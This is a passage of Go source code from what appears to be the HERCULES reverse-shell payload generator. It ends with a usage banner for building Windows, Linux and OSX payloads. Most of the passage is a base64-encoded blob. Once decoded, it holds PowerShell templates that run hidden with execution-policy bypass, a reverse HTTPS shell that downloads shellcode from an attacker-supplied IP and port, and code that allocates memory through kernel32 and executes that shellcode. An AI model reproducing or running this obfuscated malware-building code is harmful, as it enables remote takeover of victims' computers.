cmVzcykpLCBbVGV4dC5FbmNvZGluZ106OkFTQ0lJKSkuUmVhZFRvRW5kKCk7IikgZWxzZSAoJVdpbkRpciVcc3lzd293NjRcd2luZG93c3Bvd2Vyc2hlbGxcdjEuMFxwb3dlcnNoZWxsLmV4ZSAtTm9QIC1Ob25JIC1XIEhpZGRlbiAtRXhlYyBCeXBhc3MgLUNvbW1hbmQgIkludm9rZS1FeHByZXNzaW9uICQoTmV3LU9iamVjdCBJTy5TdHJlYW1SZWFkZXIgKCQoTmV3LU9iamVjdCBJTy5Db21wcmVzc2lvbi5EZWZsYXRlU3RyZWFtICgkKE5ldy1PYmplY3QgSU8uTWVtb3J5U3RyZWFtICgsJChbQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoXCJgK0VuY29kZWRDb21wcmVzc2VkQnVmZmVyK2BcIikpKSksIFtJTy5Db21wcmVzc2lvbi5Db21wcmVzc2lvbk1vZGVdOjpEZWNvbXByZXNzKSksIFtUZXh0LkVuY29kaW5nXTo6QVNDSUkpKS5SZWFkVG9FbmQoKTsiKQoKYAoKICByZXR1cm4gU2hlbGxfVGVtcGxhdGU7Cgp9CgoKZnVuYyBSRVZFUlNFX0hUVFBTX1NIRUxMKElQX1BPUlQgc3RyaW5nKSAoc3RyaW5nKSB7Ly9sLCBfIDo9IGJhc2U2NC5TdGRFbmNvZGluZy5EZWNvZGUoYmFzZTY0VGV4dCwgW11ieXRlKG1lc3NhZ2UpKQogIAoKClBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcywgXyA6PSBiYXNlNjQuU3RkRW5jb2RpbmcuRGVjb2RlU3RyaW5nKGBKSEVnUFNCQUlnMEtXMFJzYkVsdGNHOXlkQ2dpYTJWeWJtVnNNekl1Wkd4c0lpbGRJSEIxWW14cFl5QnpkR0YwYVdNZ1pYaDBaWEp1CklFbHVkRkIwY2lCV2FYSjBkV0ZzUVd4c2IyTW9TVzUwVUhSeUlHeHdRV1JrY21WemN5d2dkV2x1ZENCa2QxTnBlbVVzSUhWcGJuUWcKWm14QmJHeHZZMkYwYVc5dVZIbHdaU3dnZFdsdWRDQm1iRkJ5YjNSbFkzUXBPdzBLVzBSc2JFbHRjRzl5ZENnaWEyVnlibVZzTXpJdQpaR3hzSWlsZElIQjFZbXhwWXlCemRHRjBhV01nWlhoMFpYSnVJRWx1ZEZCMGNpQkRjbVZoZEdWVWFISmxZV1FvU1c1MFVIUnlJR3h3ClZHaHlaV0ZrUVhSMGNtbGlkWFJsY3l3Z2RXbHVkQ0JrZDFOMFlXTnJVMmw2WlN3Z1NXNTBVSFJ5SUd4d1UzUmhjblJCWkdSeVpYTnoKTENCSmJuUlFkSElnYkhCUVlYSmhiV1YwWlhJc0lIVnBiblFnWkhkRGNtVmhkR2x2Ymtac1lXZHpMQ0JKYm5SUWRISWdiSEJVYUhKbApZV1JKWkNrN0RRb2lRQTBLZEhKNWV5UmtJRDBnSWtGQ1EwUkZSa2RJU1VwTFRFMU9UMUJSVWxOVVZWWlhXRmxhWVdKalpHVm1aMmhwCmFtdHNiVzV2Y0hGeWMzUjFkbmQ0ZVhvd01USXpORFUyTnpnNUlpNVViME5vWVhKQmNuSmhlU2dwRFFwbWRXNWpkR2x2YmlCaktDUjIKS1hzZ2NtVjBkWEp1SUNnb1cybHVkRnRkWFNBa2RpNVViME5vWVhKQmNuSmhlU2dwSUh3Z1RXVmhjM1Z5WlMxUFltcGxZM1FnTFZOMQpiU2t1VTNWdElDVWdNSGd4TURBZ0xXVnhJRGt5S1gwTkNtWjFibU4wYVc5dUlIUWdleVJtSUQwZ0lpSTdNUzR1TTN4bWIzSmxZV05vCkxXOWlhbVZqZEhza1ppczlJQ1JrV3loblpYUXRjbUZ1Wkc5dElDMXRZWGhwYlhWdElDUmtMa3hsYm1kMGFDbGRmVHR5WlhSMWNtNGcKSkdZN2ZRMEtablZ1WTNScGIyNGdaU0I3SUhCeWIyTmxjM01nZTF0aGNuSmhlVjBrZUNBOUlDUjRJQ3NnSkY5OU95QmxibVFnZXlSNApJSHdnYzI5eWRDMXZZbXBsWTNRZ2V5aHVaWGN0YjJKcVpXTjBJRkpoYm1SdmJTa3VibVY0ZENncGZYMTlEUXBtZFc1amRHbHZiaUJuCmV5Qm1iM0lnS0NScFBUQTdKR2tnTFd4MElEWTBPeVJwS3lzcGV5Um9JRDBnZERza2F5QTlJQ1JrSUh3Z1pUc2dJR1p2Y21WaFkyZ2cKS0NSc0lHbHVJQ1JyS1hza2N5QTlJQ1JvSUNzZ0pHdzdJR2xtSUNoaktDUnpLU2tnZXlCeVpYUjFjbTRnSkhNZ2ZYMTljbVYwZFhKdQpJQ0k1ZGxoVklqdDlEUXBiVG1WMExsTmxjblpwWTJWUWIybHVkRTFoYm1GblpYSmRPanBUWlhKMlpYSkRaWEowYVdacFkyRjBaVlpoCmJHbGtZWFJwYjI1RFlXeHNZbUZqYXlBOUlIc2tkSEoxWlgwN0pHMGdQU0JPWlhjdFQySnFaV04wSUZONWMzUmxiUzVPWlhRdVYyVmkKUTJ4cFpXNTBPdzBLSkcwdVNHVmhaR1Z5Y3k1QlpHUW9JblZ6WlhJdFlXZGxiblFpTENBaVRXOTZhV3hzWVM4MExqQWdLR052YlhCaApkR2xpYkdVN0lFMVRTVVVnTmk0eE95QlhhVzVrYjNkeklFNVVLU0lwT3lSdUlEMGdaenNnVzBKNWRHVmJYVjBnSkhBZ1BTQWtiUzVFCmIzZHViRzloWkVSaGRHRW9JbWgwZEhCek9pOHZZQ3R6ZEhKcGJtY29TVkJmVUU5U1ZDa3JZQzhrYmlJZ0tRMEtKRzhnUFNCQlpHUXQKVkhsd1pTQXRiV1Z0WW1WeVJHVm1hVzVwZEdsdmJpQWtjU0F0VG1GdFpTQWlWMmx1TXpJaUlDMXVZVzFsYzNCaFkyVWdWMmx1TXpKRwpkVzVqZEdsdmJuTWdMWEJoYzNOMGFISjFEUW9rZUQwa2J6bzZWbWx5ZEhWaGJFRnNiRzlqS0RBc0pIQXVUR1Z1WjNSb0xEQjRNekF3Ck1Dd3dlRFF3S1R0YlUzbHpkR1Z0TGxKMWJuUnBiV1V1U1c1MFpYSnZjRk5sY25acFkyVnpMazFoY25Ob1lXeGRPanBEYjNCNUtDUncKTENBd0xDQmJTVzUwVUhSeVhTZ2tlQzVVYjBsdWRETXlLQ2twTENBa2NDNU1aVzVuZEdncERRb2tiem82UTNKbFlYUmxWR2h5WldGawpLREFzTUN3a2VDd3dMREFzTUNrZ2ZDQnZkWFF0Ym5Wc2JEc2dVM1JoY25RdFUyeGxaWEFnTFZObFkyOXVaQ0E0TmpRd01IMWpZWFJqCmFIdDlgKQoKICBJbmRleCA6PSBzdHJpbmdzLlJlcGxhY2Uoc3RyaW5nKFBvd2Vyc2hlbGxfUmV2ZXJzZV9IdHRwcyksICIrc3RyaW5nKElQX1BPUlQpKyIsIElQX1BPUlQsIC0xKQoKCiAgcmV0dXJuIHN0cmluZyhJbmRleCkKCn0K`
var LINUX_PAYLOAD string = ``
var OSX_PAYLOAD string = ``




var HELP string = `

                  __  ____________  ________  ____    ___________
                 / / / / ____/ __ \/ ____/ / / / /   / ____/ ___/
                / /_/ / __/ / /_/ / /   / / / / /   / __/  \__ \ 
               / __  / /___/ _, _/ /___/ /_/ / /___/ /___ ___/ / 
              /_/ /_/_____/_/ |_|\____/\____/_____/_____//____/  
                                                   

############################ HERCULES REVERSE SHELL ############################



Usage : ./HERCULES <Local Ip> <Local Port> <options>


Options : 

      -p                 Payload to use. ( Windows / Linux / OSX )

      -a                 The architecture to use. ( x86, x64 )
      
      -l                 Specify linking type for compiler. ( static, dynamic )


`

